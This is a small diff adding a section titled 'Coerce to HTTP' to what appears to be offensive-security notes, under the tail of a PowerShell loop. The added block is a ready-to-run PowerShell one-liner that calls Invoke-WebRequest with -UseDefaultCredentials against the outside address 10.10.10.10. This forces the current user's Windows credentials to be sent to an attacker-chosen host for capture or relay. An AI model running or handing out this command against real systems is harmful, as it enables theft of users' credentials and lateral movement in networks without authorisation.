@@ -26,5 +26,9 @@ while ($true) {
 }
 ```
 
+### Coerce to HTTP
 
+```powershell
+powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri 'http://10.10.10.10' -UseDefaultCredentials -UseBasicParsing"
+```
 
